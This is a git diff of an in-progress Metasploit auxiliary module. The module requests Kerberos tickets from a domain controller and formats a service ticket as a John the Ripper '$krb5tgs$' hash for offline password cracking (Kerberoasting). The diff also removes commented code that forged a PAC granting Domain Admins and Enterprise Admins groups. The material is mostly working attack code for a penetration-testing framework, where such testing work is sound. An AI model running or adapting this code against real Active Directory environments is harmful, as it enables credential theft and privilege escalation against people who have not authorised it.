@@ -46,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-
   # Sends the required kerberos AS requests for a kerberos Ticket Granting Ticket
   #
   # @param opts [Hash]
@@ -68,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # First stage: Initial AS-REQ request, used to exchange supported encryption methods.
     # The server may respond with a ticket granting ticket (TGT) immediately,
-    # or the client will second AS-REQ is required
+    # or the client may require preauthentication, and a second AS-REQ is required
 
     print_status("#{peer} - Sending First AS-REQ...")
     now = Time.now.utc
@@ -109,14 +108,13 @@ class MetasploitModule < Msf::Auxiliary
 
     # Determine if preauthentication is required, or if the server has responded with a ticket granting ticket
     if !is_preauth_required
-      # If preauth is not required, then the ticket granting ticket was already in the asrep response
       print_status("#{peer} - Preauthentication not required...")
       print_good("TODO: Log ticket for later offline cracking")
       # print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
       initial_as_res.ticket
       as_rep_result = initial_as_res
     else
-      print_status("#{peer} - Preauthentication required...")
+      vprint_status("#{peer} - Preauthentication required...")
       preauth_as_req = build_as_request(
         pa_data: [
           build_as_pa_time_stamp(key: password_digest, etype: desired_encryption_type),
@@ -141,7 +139,6 @@ class MetasploitModule < Msf::Auxiliary
       as_rep_result = preauth_as_res
     end
 
-
     if as_rep_result.msg_type != Rex::Proto::Kerberos::Model::AS_REP
       vprint_status("Kerberos ticket granting ticket created successfully")
       raise "todo"
@@ -150,8 +147,24 @@ class MetasploitModule < Msf::Auxiliary
     {
       ticket: as_rep_result.ticket,
       auth: extract_enc_kdc_response(as_rep_result, password_digest),
-      enc_part: as_rep_result.enc_part
     }
+  end
+
+  # TODO: Test this with https://www.ibm.com/docs/en/elm/6.0?topic=encryption-enforcing-algorithms-domain-clients
+  def format_tgs_rep_to_john(service_user, service_spn, res)
+    service_spn = service_spn.gsub(':', '~')
+
+    case res.ticket.enc_part.etype
+    when Rex::Proto::Kerberos::Crypto::RC4_HMAC, Rex::Proto::Kerberos::Crypto::DES_CBC_MD5
+      "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
+    # when Rex::Proto::Kerberos::Crypto::AES128_CTS_HMAC_SHA1_96,
+    #     Rex::Proto::Kerberos::Crypto::AES256_CTS_HMAC_SHA1_96
+    # TODO: Implement
+    #   "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
+    else
+      print_warning "Unsupported ticket type #{res.ticket.enc_part.etype}"
+      nil
+    end
   end
 
   def run
@@ -171,149 +184,57 @@ class MetasploitModule < Msf::Auxiliary
       realm: domain,
     )
 
-    # require 'pry'; binding.pry
-
-    # TODO: Tomorrow's problems:
-    #   - Find out what enc_part is for, do we need to pass it as part of the tgs?
-
     now = Time.now.utc
     expiry_time = now + 1.day
 
-    require 'pry'; binding.pry
-    #
-    # pac = build_pac(
-    #   client_name: client_name,
-    #   # group_ids: groups,
-    #   # domain_id: domain_sid,
-    #   # user_id: user_rid,
-    #   realm: domain,
-    #   # logon_time: logon_time,
-    #   checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
-    # )
-    #
-    # auth_data = build_pac_authorization_data(pac: pac)
+    # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
+    options =  0x40810010
+
+    service_user = 'fake_mysql'
+    service_spn =  'ADF3.LOCAL\fake_mysql' # ldap response: "fake_msql/dc3.adf3.local"
 
     tgs_res = send_request_tgs(
-      # TODO: client_name isn't required as part of the tgs body, it's part of the authenticator data though. TODO: Find the difference between cname and client_name
-      client_name: client_name,
-      # cname: client_name,
-      # TODO:
-      server_name: 'adf3.local\fake_mysql',  # "krbtgt/#{domain}",
-      realm: domain,
-      ticket: tgt_result[:ticket],
+      req: build_tgs_request({
+        session_key: tgt_result[:auth].key,
+        subkey: nil,
+        checksum: nil,
+        ticket: tgt_result[:ticket],
+        realm: domain,
+        client_name: client_name,
+        options: options,
 
-      # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
-      options: 0x40810010,
+        body: build_tgs_request_body(
+          cname: nil,
+          sname: build_server_name(
+            server_name: service_spn,
+            server_type: Rex::Proto::Kerberos::Model::NT_MS_PRINCIPAL
+          ),
+          realm: domain,
+          options: options,
 
-      # TODO: Find the difference between session_key and subkey
-      # From: lib/msf/core/exploit/remote/kerberos/client/tgs_request.rb:134 Msf::Exploit::Remote::Kerberos::Client::TgsRequest#build_ap_req:
-      session_key: tgt_result[:auth].key,
-      subkey: nil,
-      checksum: nil,
+          # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
+          from: nil,
+          till: expiry_time,
+          rtime: expiry_time,
 
-      # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
-      from: nil,
-      till: expiry_time,
-      rtime: expiry_time,
-
-      # certificate time
-      ctime: now,
-
-      # TODO: Confirm if we can pass around the decrypted and encrypted together for debugging
-      #             auth_data: tgt_result[:auth],
-      #             TODO: Confirm sub_key is session_key
-      #
-      # Do we need to generate this still?
-      # pa_data: [
-      #   build_pa_pac_request
-      # ],
-      # subkey: sub_key
+          # certificate time
+          ctime: now,
+        )
+      })
     )
+
+    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
+      print_error("#{tgs_res.error_code}")
+    else
+      puts format_tgs_rep_to_john(service_user, service_spn, tgs_res)
+    end
 
     return
 
-    # auth = []
-    # auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
-    # auth << build_pa_pac_request
-    # auth
-    #
-    # print_status("#{peer} - Sending AS-REQ...")
-    # res = send_request_as(
-    #   client_name: client_name,
-    #   server_name: server_name,
-    #   realm: domain.to_s,
-    #   key: password_digest,
-    #   pa_data: pre_auth
-    # )
-    #
-    # unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
-    #   print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-    #   print_error("#{peer} - Invalid AS-REP, aborting...")
-    #   return
-    # end
-    #
-    # print_status("#{peer} - Parsing AS-REP...")
-    #
-    # session_key = extract_session_key(res, password_digest)
-    # logon_time = extract_logon_time(res, password_digest)
-    # ticket = res.ticket
-
-    pre_auth = []
-    pre_auth << build_pa_pac_request
-
-    groups = [
-      513, # DOMAIN_USERS
-      512, # DOMAIN_ADMINS
-      520, # GROUP_POLICY_CREATOR_OWNERS
-      518, # SCHEMA_ADMINISTRATORS
-      519  # ENTERPRISE_ADMINS
-    ]
-
-    # user_sid_arr = datastore['USER_SID'].split('-')
-    # domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
-    # user_rid = user_sid_arr[user_sid_arr.length - 1].to_i
-
-    pac = build_pac(
-      client_name: client_name,
-      group_ids: groups,
-      domain_id: domain_sid,
-      user_id: user_rid,
-      realm: domain,
-      logon_time: logon_time,
-      checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
-    )
-
-    auth_data = build_pac_authorization_data(pac: pac)
-    sub_key = build_subkey(subkey_type: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
-
-    print_status("#{peer} - Sending TGS-REQ...")
-
-    res = send_request_tgs(
-      client_name: client_name,
-      server_name: server_name,
-      realm: domain,
-      session_key: session_key,
-      ticket: ticket,
-      auth_data: auth_data,
-      pa_data: pre_auth,
-      subkey: sub_key
-    )
-
-    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
-      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-      print_error("#{peer} - Invalid TGS-REP, aborting...")
-      return
-    end
-
-    print_good("#{peer} - Valid TGS-Response, extracting credentials...")
-
-    cache = extract_kerb_creds(res, sub_key.value)
-
-    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
-    print_good("#{peer} - MIT Credential Cache saved on #{path}")
-  end
-
-  def warn_error(res)
-    res.error_code.to_s
+    # TODO:
+    # print_good("#{peer} - Valid TGS-Response, extracting credentials...")
+    # cache = extract_kerb_creds(res, sub_key.value)
+    # path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
+    # print_good("#{peer} - MIT Credential Cache saved on #{path}")
   end
 end
